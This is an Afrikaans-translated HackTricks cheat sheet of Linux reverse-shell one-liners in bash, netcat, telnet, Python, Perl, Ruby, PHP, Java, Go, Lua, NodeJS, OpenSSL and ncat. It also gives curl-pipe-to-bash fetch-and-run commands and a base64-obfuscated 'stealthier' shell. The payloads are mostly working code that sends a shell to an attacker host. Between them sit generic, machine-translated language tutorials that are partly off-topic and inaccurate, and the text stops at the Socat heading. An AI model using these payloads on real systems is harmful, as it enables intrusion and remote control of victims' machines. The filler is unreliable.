# Skulpe - Linux

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**As jy vrae het oor enige van hierdie skulpe, kan jy dit nagaan met** [**https://explainshell.com/**](https://explainshell.com)

## Volledige TTY

**Sodra jy 'n omgekeerde skulp kry**[ **lees hierdie bladsy om 'n volledige TTY te verkry**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Moenie vergeet om te kyk na ander skulpe nie: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, en bash.

### Simbool veilige skulp
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Skulverduideliking

1. **`bash -i`**: Hierdie deel van die bevel begin 'n interaktiewe (`-i`) Bash-skyf.
2. **`>&`**: Hierdie deel van die bevel is 'n kort notasie vir die **omleiding van beide standaarduitvoer** (`stdout`) en **standaardfout** (`stderr`) na dieselfde bestemming.
3. **`/dev/tcp/<AANVALLER-IP>/<POORT>`**: Dit is 'n spesiale lêer wat 'n TCP-verbinding na die gespesifiseerde IP-adres en poort **voorstel**.
* Deur die uitvoer- en foutstrome na hierdie lêer te **omlei**, stuur die bevel die uitset van die interaktiewe skyfsessie effektief na die aanvaller se masjien.
4. **`0>&1`**: Hierdie deel van die bevel **omlei standaardinskrywing (`stdin`) na dieselfde bestemming as standaarduitvoer (`stdout`)**.

### Skep in lêer en voer uit
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Voorwaartse Skulp

As jy 'n **RCE kwesbaarheid** binne 'n Linux-gebaseerde webtoepassing teëkom, kan daar gevalle wees waar **dit moeilik word om 'n omgekeerde skulp te verkry** as gevolg van die teenwoordigheid van Iptables-reëls of ander filters. In sulke scenario's, oorweeg om 'n PTY-skulp binne die gekompromitteerde stelsel te skep deur gebruik te maak van pype.

Jy kan die kode vind op [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Jy hoef net te wysig:

* Die URL van die kwesbare gasheer
* Die voorvoegsel en agtervoegsel van jou payload (indien enige)
* Die manier waarop die payload gestuur word (koppe? data? ekstra inligting?)

Daarna kan jy net **opdragte stuur** of selfs die `upgrade`-opdrag gebruik om 'n volledige PTY te kry (let daarop dat pype gelees en geskryf word met 'n benaderde vertraging van 1.3s).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Kyk dit na by [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet is 'n protokol wat gebruik word om 'n verbinding met 'n bediener te maak en op afstand te kommunikeer. Dit maak gebruik van 'n onversleutelde verbinding, wat beteken dat die inligting wat oorgedra word, nie geïnkodeer word nie en dus vatbaar is vir afluistering. Telnet word dikwels gebruik om toegang tot 'n bediener se opdraglyn te verkry en opdragte uit te voer.

### Telnet-aanvalle

Telnet-aanvalle is 'n metode wat deur aanvallers gebruik word om toegang tot 'n bediener te verkry deur die gebruik van swak of gesteelde legitimasie-inligting. Hierdie aanvalle kan gebruik word om ongemagtigde toegang tot 'n bediener te verkry en potensieel skadelike opdragte uit te voer.

### Mitigasie

Om Telnet-aanvalle te voorkom, moet die volgende stappe geneem word:

- Telnet moet gedeaktiveer word as dit nie nodig is nie.
- As Telnet wel nodig is, moet dit slegs toeganklik wees via 'n veilige, versleutelde verbinding.
- Sterk legitimasiebeleid moet geïmplementeer word om te verseker dat slegs geakkrediteerde gebruikers toegang tot die Telnet-diens het.
- Die gebruik van sterk, unieke wagwoorde moet afgedwing word om die risiko van gesteelde legitimasie-inligting te verminder.

### Voorbeeld

```bash
telnet 192.168.0.1
```

In hierdie voorbeeld maak die gebruiker 'n Telnet-verbinding met die IP-adres 192.168.0.1.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Wie is

**Aanvaller**
```bash
while true; do nc -l <port>; done
```
Om die bevel te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)

**Slagoffer**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python is 'n baie gewilde programmeertaal wat algemeen gebruik word in die hacking-gemeenskap. Dit is 'n hoëvlaktaal met 'n eenvoudige sintaksis, wat dit maklik maak om te leer en te gebruik. Python bied 'n wye verskeidenheid biblioteke en modules wat spesifiek ontwerp is vir hacking en pentesting.

### Python-installasie

Om Python op Linux te installeer, kan jy die volgende opdrag gebruik:

```bash
sudo apt-get install python
```

### Python-skripsies uitvoer

Om 'n Python-skripsie uit te voer, gebruik die volgende sintaksis:

```bash
python skripsie.py
```

### Python-interaktiewe modus

Python bied 'n interaktiewe modus wat gebruik kan word om Python-kode regstreeks in die opdragreël uit te voer. Om die interaktiewe modus te begin, tik eenvoudig `python` in die opdragreël.

### Python-biblioteke vir hacking

Daar is 'n verskeidenheid Python-biblioteke wat nuttig kan wees vir hacking en pentesting. Hier is 'n paar voorbeelde:

- **Scapy**: 'n kragtige en veelsydige biblioteek vir netwerkpakketmanipulasie.
- **Requests**: 'n eenvoudige en maklik om te gebruik biblioteek vir HTTP-aanvrae.
- **BeautifulSoup**: 'n biblioteek vir die skraping van webinhoud.
- **Paramiko**: 'n SSH-implementering vir Python.
- **Pycrypto**: 'n biblioteek vir kriptografie-operasies.
- **Selenium**: 'n biblioteek vir outomatiese webblaaierinteraksie.

### Python-bronne

As jy meer wil leer oor Python en hoe dit gebruik kan word vir hacking, is hier 'n paar nuttige bronne:

- [Python.org](https://www.python.org/): Die amptelike webwerf van Python, met dokumentasie en tutoriale.
- [Hacking with Python](https://www.hackingwithpython.com/): 'n Gratis aanlynbron met praktiese hacking-projekte en tutoriale.
- [Black Hat Python](https://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900): 'n Boek deur Justin Seitz wat Python-programmering toepas op hacking-scenarios.

Python is 'n kragtige en veelsydige taal wat 'n waardevolle hulpmiddel kan wees vir enige hacker of pentester. Deur Python te leer en te gebruik, kan jy jou vaardighede in die hacking-wêreld verbeter en meer doeltreffend word in jou pogings.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl is 'n kragtige skriptaal wat algemeen gebruik word in die wêreld van hacking. Dit bied 'n verskeidenheid funksies en modules wat dit 'n gewilde keuse maak vir die uitvoer van verskillende hacking-take.

### Uitvoer van Perl-skrips

Om 'n Perl-skrip uit te voer, gebruik die volgende sintaks:

```bash
perl skrip.pl
```

### Basiese sintaks

Hier is 'n paar basiese sintaksreëls vir Perl:

- Kommentaar: `# Hierdie is 'n kommentaar`
- Veranderlike toekenning: `$naam = waarde;`
- Druk na die skerm: `print "Boodskap";`
- Invoer vanaf die gebruiker: `$invoer = <STDIN>;`

### Belangrike funksies en modules

Perl het 'n ryk versameling funksies en modules wat nuttig kan wees vir hacking. Hier is 'n paar belangrike een:

- `system()`: Hierdie funksie voer 'n stelseloproepe uit en kan gebruik word om eksterne opdragte uit te voer.
- `open()`: Hierdie funksie maak 'n lêer oop vir lees- of skryftoegang.
- `close()`: Hierdie funksie sluit 'n oop lêer.
- `chdir()`: Hierdie funksie verander die huidige werkspasie.
- `unlink()`: Hierdie funksie verwyder 'n lêer van die lêersisteem.

### Voorbeeld van 'n Perl-skrip

Hier is 'n voorbeeld van 'n eenvoudige Perl-skrip wat die huidige datum en tyd druk:

```perl
#!/usr/bin/perl

use strict;
use warnings;

my $datum_tyd = `date`;
print "Die huidige datum en tyd is: $datum_tyd";
```

Hierdie skrip gebruik die `date`-opdrag om die huidige datum en tyd te kry en druk dit dan na die skerm.

### Slotwoord

Perl is 'n kragtige skriptaal wat 'n verskeidenheid hacking-take kan uitvoer. Deur die gebruik van die regte funksies en modules, kan jy doeltreffend en doelgerig te werk gaan in jou hacking-projekte.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby is 'n dinamiese, objek-georiënteerde programmeertaal wat algemeen gebruik word vir webontwikkeling en skripskryf. Dit het 'n eenvoudige sintaksis en is maklik om te leer en te gebruik. Hier is 'n paar belangrike punte oor Ruby:

- **Interaktiewe omgewing**: Ruby het 'n interaktiewe omgewing, bekend as 'n IRB (Interactive Ruby), waar jy kode kan skryf en dit onmiddellik kan uitvoer om resultate te sien.

- **Objek-georiënteerd**: Ruby is 'n volledig objek-georiënteerde programmeertaal, wat beteken dat alles in Ruby 'n objek is. Dit maak gebruik van klasse en objek om funksionaliteit te organiseer en te struktureer.

- **Dinamies**: Ruby is 'n dinamiese programmeertaal, wat beteken dat jy veranderlikes kan skep en hulle kan toewys sonder om hulle tipes vooraf te spesifiseer. Dit maak dit maklik om kode te skryf en te verander sonder om jouself te bekommer oor tipes nie.

- **Gemeenskap**: Ruby het 'n aktiewe en ondersteunende gemeenskap van ontwikkelaars regoor die wêreld. Daar is baie bronne, tutoriale en biblioteke beskikbaar om jou te help om met Ruby te werk.

- **Rails**: Ruby on Rails is 'n gewilde webraamwerk wat gebou is op Ruby. Dit bied 'n gestandaardiseerde manier om webtoepassings te bou en maak gebruik van die krag van Ruby se objek-georiënteerde model.

As jy belangstel om Ruby te leer, kan jy begin deur die dokumentasie en tutoriale op die amptelike Ruby-webwerf te bestudeer. Daar is ook baie boeke en aanlynbronne beskikbaar wat jou kan help om die taal te leer en te bemeester.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP is 'n skripsie-taal wat algemeen gebruik word vir die ontwikkeling van webtoepassings. Dit word meestal geïnterpreteer deur 'n webbediener wat die uitvoering van PHP-kode moontlik maak. Hier is 'n paar belangrike punte om in gedagte te hou wanneer dit kom by PHP:

- **Ingeslote kode**: PHP-kode word gewoonlik ingesluit in HTML-dokumente deur gebruik te maak van die `<?php` en `?>` etikette. Hierdie kode word uitgevoer deur die webbediener voordat die HTML na die kliënt gestuur word.
- **Dinamiese inhoud**: PHP maak dit moontlik om dinamiese inhoud op 'n webwerf te skep deur die gebruik van veranderlikes, lusse, voorwaardelike verklarings en funksies.
- **Databasisinteraksie**: PHP kan gebruik word om te kommunikeer met 'n databasis deur middel van verskillende databasisverbindingsbiblioteke soos MySQLi en PDO.
- **Veiligheidsoorwegings**: Dit is belangrik om sekuriteitsmaatreëls in ag te neem wanneer jy PHP-kode skryf om te verseker dat jou webtoepassing nie kwesbaar is vir aanvalle soos SQL-injeksie of kruisskripsaanvalle nie.
- **Foutafhandeling**: PHP bied verskillende metodes om foute af te handel, insluitend die gebruik van uitsonderings en foutkodes.

PHP bied 'n kragtige en veelsydige raamwerk vir die ontwikkeling van webtoepassings. Dit is belangrik om 'n goeie begrip van die taal te hê en om bewus te wees van die beste praktyke vir die skryf van veilige en doeltreffende PHP-kode.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java is 'n populaire programmeertaal wat gebruik word vir die ontwikkeling van verskeie toepassings, insluitend webtoepassings, mobiele toepassings en bedryfsagteware. Dit is 'n objekgeoriënteerde taal wat bekendheid geniet vir sy veiligheid, betroubaarheid en draagbaarheid.

### Voordeligheid van Java vir hackers

Java bied 'n paar voordelige eienskappe vir hackers:

- **Platformonafhanklikheid**: Java-kode kan uitgevoer word op verskillende bedryfstelsels, soos Windows, Linux en macOS, sonder om dit te hoef herskryf. Dit maak dit makliker vir hackers om hul gereedskap en aanvalskode op verskillende doelwitte te gebruik.

- **Groot gemeenskap**: Java het 'n groot gemeenskap van ontwikkelaars en ondersteuners wat gereed is om hulp te bied en kennis te deel. Hierdie gemeenskap bied 'n ryk bron van inligting, hulpmiddels en biblioteke wat hackers kan gebruik om hul vaardighede te verbeter en aanvalskode te ontwikkel.

- **Veiligheidsmaatreëls**: Java het ingeboude veiligheidsmaatreëls wat die uitvoering van skadelike kodes beperk. Hierdie maatreëls sluit in 'n streng toegangsbeheerstelsel, geheuebestuur en 'n sandboksomgewing vir die uitvoering van onbekende kodes. Alhoewel dit 'n uitdaging kan wees vir hackers om hierdie maatreëls te omseil, kan dit ook 'n geleentheid bied om kreatiewe maniere te vind om dit te doen.

### Java-hackingtegnieke

Java bied 'n verskeidenheid hackingtegnieke wat hackers kan gebruik om toegang te verkry tot stelsels, data te ontgin en aanvalle uit te voer. Hier is 'n paar voorbeelde van sulke tegnieke:

- **Java Remote Method Invocation (RMI)**: Hierdie tegniek maak dit moontlik vir 'n hacker om kode uit te voer op 'n afgeleë Java-stelsel deur gebruik te maak van die RMI-meganisme. Dit kan gebruik word om toegang te verkry tot gevoelige data of om skadelike kodes op die doelwitstelsel uit te voer.

- **Java Applet-aanvalle**: Java-applets is klein programme wat in 'n webblaaier uitgevoer kan word. Hackers kan kwaadwillige applets ontwikkel wat gebruik maak van swakplekke in die Java-beveiliging om toegang te verkry tot die stelsel van die gebruiker en skadelike aksies uit te voer.

- **Java Deserialisering-aanvalle**: Hierdie aanvaltegniek maak gebruik van swakplekke in die deserialiseringproses van Java-objekte om skadelike kodes uit te voer. Deur 'n kwaadwillige objek te skep en dit na 'n kwesbare toepassing te stuur, kan 'n hacker die uitvoering van skadelike kodes op die doelwitstelsel veroorsaak.

- **Java-beveiligingslekke**: Soos enige ander programmeertaal, het Java ook sy deel van beveiligingslekke. Hackers kan hierdie lekke uitbuit om toegang te verkry tot stelsels, data te ontgin of aanvalle uit te voer. Dit sluit in swakplekke in die Java-virtuele masjien, biblioteke en frameworks wat deur Java-toepassings gebruik word.

### Hulpmiddels vir Java-hacking

Daar is 'n verskeidenheid hulpmiddels beskikbaar vir hackers wat Java-hackingtegnieke wil toepas. Hier is 'n paar voorbeelde van sulke hulpmiddels:

- **Metasploit**: Metasploit is 'n kragtige raamwerk vir die ontwikkeling en uitvoering van aanvalskode. Dit bied 'n verskeidenheid modules en hulpmiddels wat spesifiek ontwerp is vir Java-hacking.

- **Java Decompilers**: Java Decompilers is hulpmiddels wat gebruik word om Java-kode te ontleed en te analiseer. Dit kan nuttig wees vir hackers om die werking van Java-toepassings te verstaan en swakplekke te identifiseer.

- **Burp Suite**: Burp Suite is 'n uitgebreide hulpmiddelstel vir webtoepassingtoetsing en -hacking. Dit bied 'n reeks modules en funksies wat spesifiek ontwerp is vir die identifisering en uitbuiting van swakplekke in Java-webtoepassings.

- **Java Security Manager**: Java Security Manager is 'n ingeboude hulpmiddel wat gebruik kan word om die toegang tot hulpbronne en funksies in Java-toepassings te beperk. Dit kan nuttig wees vir hackers om beperkings te omseil en toegang te verkry tot verbode hulpbronne.

### Slotwoord

Java bied 'n wye verskeidenheid hackingtegnieke en hulpmiddels vir hackers om toegang te verkry tot stelsels, data te ontgin en aanvalle uit te voer. Dit is belangrik vir hackers om 'n diepgaande begrip van die Java-programmeertaal en die veiligheidsmaatreëls daarvan te hê om suksesvolle aanvalle uit te voer.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat is a powerful networking utility that is included in the Nmap suite. It is designed to be a flexible and reliable tool for network exploration and security auditing. Ncat can be used to create and manage network connections, perform port scanning, and transfer files between systems.

### Basic Usage

To establish a basic TCP connection using Ncat, you can use the following command:

```
ncat <target_ip> <port>
```

Replace `<target_ip>` with the IP address of the target system and `<port>` with the desired port number.

### Port Scanning

Ncat can also be used for port scanning. To scan a range of ports on a target system, you can use the following command:

```
ncat -v -z <target_ip> <start_port>-<end_port>
```

Replace `<target_ip>` with the IP address of the target system, `<start_port>` with the starting port number, and `<end_port>` with the ending port number.

### File Transfer

Ncat supports file transfer between systems. To send a file from the local system to a remote system, you can use the following command:

```
ncat -l <port> < file_to_send
```

Replace `<port>` with the desired port number and `file_to_send` with the name of the file you want to send.

To receive a file on the local system, you can use the following command on the remote system:

```
ncat <local_ip> <port> > file_to_receive
```

Replace `<local_ip>` with the IP address of the local system, `<port>` with the desired port number, and `file_to_receive` with the name you want to give to the received file.

### Conclusion

Ncat is a versatile tool that can be used for various networking tasks, including establishing network connections, performing port scanning, and transferring files between systems. Its flexibility and reliability make it a valuable asset for network exploration and security auditing.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua is 'n kragtige, vinnige en ligte skriptaal wat dikwels gebruik word vir die ontwikkeling van spelletjies, webtoepassings en ander sagteware. Dit bied 'n eenvoudige sintaksis en 'n klein geheue-afdruk, wat dit 'n gewilde keuse maak vir verskeie toepassings.

### Lua Skelms

#### Lua Skelms deur die opstel van 'n skadelike kode

Om 'n Lua-skelm te skep, kan jy skadelike kode in 'n Lua-skripsie insluit. Wanneer die skripsie uitgevoer word, sal die skadelike kode ook uitgevoer word. Dit kan gebruik word om verskeie aanvalle uit te voer, soos die uitvoering van skadelike instruksies, die verkryging van toegang tot die stelsel, of die verspreiding van malware.

#### Lua Skelms deur die manipulasie van bestaande skripsies

'n Ander metode om 'n Lua-skelm te skep, is deur die manipulasie van bestaande Lua-skripsies. Dit kan gedoen word deur die insluiting van skadelike kode in 'n bestaande skripsie, of deur die verandering van die funksionaliteit van 'n bestaande skripsie om skadelike aksies uit te voer.

### Lua Skelms Voorkoming

Om Lua-skripsieskelms te voorkom, moet jy sekuriteitsmaatreëls implementeer soos:

- Vertrou nie onbetroubare bronne nie en verifieer die bron van die skripsie voordat dit uitgevoer word.
- Beperk die toegang tot die Lua-omgewing en beperk die funksies wat beskikbaar is vir uitvoering.
- Monitor die uitvoering van Lua-skripsies vir enige verdagte aktiwiteit.
- Verseker dat die Lua-omgewing opgedateer en gepatch is om bekende kwesbaarhede te voorkom.

### Lua Skelms Oplossings

As jy vermoed dat 'n Lua-skripsie 'n skelm bevat, kan jy die volgende stappe neem om dit op te los:

1. Verwyder die skadelike kode uit die skripsie.
2. Verifieer die bron van die skripsie en verseker dat dit betroubaar is.
3. Monitor die stelsel vir enige verdagte aktiwiteit en neem stappe om dit te beperk.
4. Verseker dat die Lua-omgewing opgedateer en gepatch is om bekende kwesbaarhede te voorkom.

Deur hierdie maatreëls te implementeer, kan jy die risiko van Lua-skripsieskelms verminder en jou stelsel veilig hou.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS is 'n open-source, platform-onafhanklike uitvoeringsomgewing wat gebruik word vir die ontwikkeling van skaalbare en vinnige netwerktoepassings. Dit is gebou op die V8 JavaScript-enjin en maak gebruik van 'n nie-blokkerende I/O-model, wat beteken dat dit effektief kan omgaan met baie gelyktydige verbindings sonder om die prestasie te beïnvloed.

### Installasie

Om NodeJS op Linux te installeer, kan jy die volgende stappe volg:

1. Voer die volgende opdrag uit om die NodeJS-pakketbron te installeer:

   ```
   curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
   ```

2. Installeer NodeJS deur die volgende opdrag uit te voer:

   ```
   sudo apt-get install -y nodejs
   ```

3. Om te bevestig dat NodeJS suksesvol geïnstalleer is, kan jy die volgende opdrag uitvoer:

   ```
   node -v
   ```

### Aan die gang

Om 'n nuwe NodeJS-projek te skep, kan jy die volgende stappe volg:

1. Skep 'n nuwe leë gids vir jou projek:

   ```
   mkdir myproject
   cd myproject
   ```

2. Skep 'n nuwe `package.json`-lêer deur die volgende opdrag uit te voer:

   ```
   npm init -y
   ```

3. Installeer enige afhanklikhede wat jy benodig vir jou projek deur die volgende opdrag uit te voer:

   ```
   npm install <afhanklikheid>
   ```

4. Skep 'n nuwe JavaScript-lêer, byvoorbeeld `index.js`, en skryf jou NodeJS-kode daarin.

5. Voer jou NodeJS-program uit deur die volgende opdrag uit te voer:

   ```
   node index.js
   ```

### Belangrike NodeJS-konsepte

Hier is 'n paar belangrike konsepte in NodeJS wat jy moet verstaan:

- **Modules**: NodeJS maak gebruik van modules om funksionaliteit te organiseer en te hergebruik. Jy kan modules invoer deur die `require`-funksie te gebruik.

- **Asynchrone programmering**: NodeJS maak gebruik van asynchrone programmering om nie-blokkerende I/O te bereik. Dit beteken dat jy funksies kan uitvoer sonder om te wag vir 'n antwoord, wat die algehele prestasie verbeter.

- **Evenementgedrewe programmering**: NodeJS is gebaseer op 'n evenementgedrewe model, waarin funksies uitgevoer word as reaksie op spesifieke gebeure. Jy kan luisteraars aanheg aan gebeure en funksies uitvoer wanneer die gebeurtenis plaasvind.

- **NPM**: NPM (Node Package Manager) is die standaard pakketsisteem vir NodeJS. Dit stel jou in staat om afhanklikhede te bestuur en te deel met ander ontwikkelaars.

- **Express**: Express is 'n gewilde webraamwerk vir NodeJS wat dit maklik maak om webtoepassings te bou. Dit bied 'n eenvoudige en elegante sintaksis vir die hantering van roetes, middelware en sjablone.

### Nuttige hulpbronne

Hier is 'n paar nuttige hulpbronne vir die leer en verbetering van jou NodeJS-vaardighede:

- [NodeJS-dokumentasie](https://nodejs.org/en/docs/)
- [NPM-dokumentasie](https://docs.npmjs.com/)
- [Express-dokumentasie](https://expressjs.com/)
- [NodeJS-tutoriale](https://www.tutorialspoint.com/nodejs/index.htm)
- [NodeJS-kursusse op Udemy](https://www.udemy.com/topic/nodejs/)
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Die Aanvaller (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Die Slagoffer
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind dop

